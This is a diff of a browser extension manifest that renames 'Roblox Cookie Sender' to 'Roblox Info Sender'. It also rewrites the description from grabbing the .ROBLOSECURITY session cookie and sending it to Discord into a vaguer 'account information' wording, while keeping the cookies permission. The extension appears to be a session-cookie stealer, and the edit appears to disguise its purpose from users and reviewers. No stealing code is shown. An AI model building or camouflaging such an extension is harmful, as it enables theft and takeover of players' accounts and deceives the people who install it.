@@ -1,8 +1,8 @@
 {
     "manifest_version": 3,
-    "name": "Roblox Cookie Sender",
+    "name": "Roblox Info Sender",
     "version": "1.0",
-    "description": "Get .ROBLOSECURITY cookie and send it to Discord.",
+    "description": "Get account information and send it to Discord.",
     "permissions": [
         "cookies",
         "storage",
